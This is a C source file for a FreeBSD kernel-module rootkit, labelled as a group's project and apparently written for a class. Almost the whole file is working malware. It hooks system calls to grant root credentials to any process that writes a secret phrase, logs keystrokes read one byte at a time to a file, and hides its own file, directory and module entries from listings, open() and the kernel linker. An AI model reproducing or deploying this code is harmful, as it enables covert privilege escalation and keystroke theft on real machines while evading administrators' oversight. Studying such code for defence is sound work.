/*
    Group 1's rootkit.
*/

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/malloc.h>
#include <sys/errno.h>
#include <sys/syslog.h>
#include <sys/libkern.h>

#include <sys/linker.h>
#include <sys/module.h>

#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>

#include <sys/dirent.h>

#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/fcntl.h>
#include <sys/file.h>

#include "config.h"

MALLOC_DEFINE(t1, "dirent", "store dirent structures");

extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
	TAILQ_ENTRY(module)	link;	/* chain together all modules */
	TAILQ_ENTRY(module)	flink;	/* all modules in a file */
	struct linker_file	*file;	/* file which contains this module */
	int			refs;	/* reference count */
	int 			id;	/* unique id number */
	char 			*name;	/* module name */
	modeventhand_t 		handler;	/* event handler */
	void 			*arg;	/* argument for handler */
	modspecific_t 		data;	/* module specific data */
};

static int hide_from_kld()
{
    struct linker_file *link_file;
    struct module *m;
    struct linker_file *kernel_file;

    // acquire a lock before accessing linker files
    sx_xlock(&kld_sx);

    // get reference to the "kernel" linker file
    kernel_file = (&linker_files)->tqh_first;

    // remove the rootkit's linker file
    TAILQ_FOREACH(link_file, &linker_files, link){
        if (strncmp(link_file->filename, ROOTKIT_LINKER_NAME, strlen(ROOTKIT_LINKER_NAME)) == 0){
            kernel_file->refs -= 2;
            next_file_id--;
            TAILQ_REMOVE(&linker_files, link_file, link);
            break;
        }
    }

    sx_xunlock(&kld_sx);

    sx_xlock(&modules_sx);

    // remove the modules of our rootkit
    TAILQ_FOREACH(m, &modules, link){
        if (strncmp(m->name, ROOTKIT_MODULE_NAME, strlen(ROOTKIT_MODULE_NAME)) == 0){
            nextid--;
            TAILQ_REMOVE(&modules, m, link);
        }
    }

    sx_xunlock(&modules_sx);

    return 0;
}

static int getdirent_hook(struct thread *td, void *args)
{
    struct getdirentries_args *g_args = (struct getdirentries_args *) args;
    int error = 0;

    // error is actually the # of bytes read
    error = sys_getdirentries(td, args);
    //log(LOG_DEBUG, "%s Error: %d\n", DEBUG_TAG, error);

    if (error != -1){
        //log(LOG_DEBUG, "%s Found some directory entries!\n", DEBUG_TAG);

        // copy the contents of the buf into kernel memory
        int n = g_args->count;
        char *ptr = malloc(n, t1, M_ZERO);
        if (ptr != NULL){
            //log(LOG_DEBUG, "%s Allocated memory at: %p.\n", DEBUG_TAG, ptr);

            // we want to operate on a local copy
            // of the contents of g_args->buf
            if (copyin(g_args->buf, ptr, n) == 0){
                //log(LOG_DEBUG, "%s Successfully copied %d bytes to the kernel!\n", DEBUG_TAG, n);
                //log(LOG_DEBUG, "Sizeof(dirent) = %d\n", sizeof(struct dirent));

                struct dirent *d_ptr = NULL;
                int i = 0;

                // loop through all the dirent entries
                while (i < n){
                    d_ptr = (struct dirent *) (ptr + i);

                    // reclen = 0 means we are at the end of the list
                    if (d_ptr->d_reclen == 0){
                        break;
                    }

                    // need to hide our rootkit!
                    if (strncmp(d_ptr->d_name, ROOTKIT_LINKER_NAME, strlen(ROOTKIT_LINKER_NAME)) == 0){
                        bzero(d_ptr->d_name, d_ptr->d_namlen);
                        d_ptr->d_namlen = 0;
                        d_ptr->d_fileno = 0;
                        d_ptr->d_type   = DT_UNKNOWN;
                        d_ptr->d_reclen = 8;
                    }

					// hide the directory of our rootkit files if it exists
					else if (strncmp(d_ptr->d_name, ROOTKIT_DIR_NAME, strlen(ROOTKIT_DIR_NAME)) == 0){
						bzero(d_ptr->d_name, d_ptr->d_namlen);
                        d_ptr->d_namlen = 0;
                        d_ptr->d_fileno = 0;
                        d_ptr->d_type   = DT_UNKNOWN;
                        d_ptr->d_reclen = 8;
					}

                    //log(LOG_DEBUG, "%s Filename: %s\n", DEBUG_TAG, d_ptr->d_name);
                    i += d_ptr->d_reclen;
                }

                // copy back to user space
                copyout(ptr, g_args->buf, n);
            }
        }

        free(ptr, t1);
    }

    return error;
}

static int write_hook(struct thread *td, void *args)
{
    int error = 0;
    struct write_args *w_args = (struct write_args *) args;
    struct proc *p = td->td_proc;

    char buf[BUF_SIZE] = {0};
    int done = 0;

    if (copyinstr(w_args->buf, buf, BUF_SIZE, &done) == 0){
        //log(LOG_DEBUG, "Writing: %s\n", buf);
        if (w_args->fd == 1 && strncmp(buf, ROOT_PHRASE, strlen(ROOT_PHRASE)) == 0){
            if (p != NULL){
                struct ucred *u = p->p_ucred;

                if (u != NULL){
                    // change the user id to root(0)
                    u->cr_uid   = 0;
                    u->cr_ruid  = 0;
                    u->cr_svuid = 0;

                    // change the group id to root(0) as well
                    u->cr_rgid  = 0;
                    u->cr_svgid = 0;
                }
            }
        }
    }

    error = sys_write(td, args);

    return error;
}

/*
    Hook function for read() syscall.
*/
static int read_hook(struct thread *td, void *args)
{
    struct read_args *uap = (struct read_args *) args;

    // kernel space stuff
    char buf[64];
    int done = 0;

    // call original read
    int error = sys_read(td, args);
    //printf("error is %d\n", error);
    //force original file desc to be 0
    uap->fd = 0;
    //error handling to ensure bad address isn't hit
    if (error ||  uap->nbyte > 1||uap->fd != 0){
        return error;
    }

    //make sure copyinstr is 0 to avoid bad address
    if(copyinstr(uap->buf, buf, 64, &done) == 0){
        //returns a file descriptor for us to use
        //opens something.txt or create it if necessary
        error = kern_openat(td, AT_FDCWD, "something.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT| O_APPEND, 0777);
        int file_fd = error;

        //part of read and device drive for I/O
        struct iovec aiov;
        struct uio auio;

        bzero(&auio, sizeof(auio));
        bzero(&aiov, sizeof(aiov));

        //read from buffer with length of 1
        aiov.iov_base = &buf;
        aiov.iov_len = 1;


        //write to something.txt on the kernal
        auio.uio_iov = &aiov;
        auio.uio_iovcnt = 1;
        auio.uio_offset = 0;
        auio.uio_resid = 1;
        auio.uio_segflg = UIO_SYSSPACE;
        auio.uio_rw = UIO_WRITE;
        auio.uio_td = td;

        //write file descriptor
        error = kern_writev(td, file_fd, &auio);

        //close the file
        struct close_args fdtmp;
        fdtmp.fd = 0;
        sys_close(td, &fdtmp);
   }

    return error;
}

static int open_hook(struct thread *td, void *syscall_args)
{
	struct open_args /* {
		char *path;
		int flags;
	} */ *uap;

	uap = (struct open_args *)syscall_args;

	char path[BUF_SIZE] = {0};
	size_t done;
	int error;

	error = copyinstr(uap->path, path, BUF_SIZE, &done);
	if (error != 0)
		return(error);

	char* file = ROOTKIT_LINKER_NAME;
	//uprintf("%s\n",path);

	// if the path has the file name in it, throw file does not exist error
	if (strstr(path, file) != NULL){
		return(ENOENT);
	}

	return (sys_open(td, syscall_args));
}

static void install_hooks()
{
    sysent[SYS_write].sy_call = (sy_call_t *) write_hook;
    sysent[SYS_open].sy_call = (sy_call_t *) open_hook;
    sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
    sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirent_hook;
}

static void uninstall_hooks()
{
    sysent[SYS_write].sy_call = (sy_call_t *) sys_write;
    sysent[SYS_open].sy_call = (sy_call_t *) sys_open;
    sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
    sysent[SYS_getdirentries].sy_call = (sy_call_t *) sys_getdirentries;
}

static int load_handler(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd){
        case MOD_LOAD:
            //log(LOG_DEBUG, "Hooking write(). ");
            install_hooks();
            hide_from_kld();
            break;
        case MOD_UNLOAD:
            //log(LOG_DEBUG, "Unhooking write(). ");
            uninstall_hooks();
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t rk_mod = {
    "rootkit",   // module name
    load_handler,   // load function
    NULL
};

DECLARE_MODULE(rootkit, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
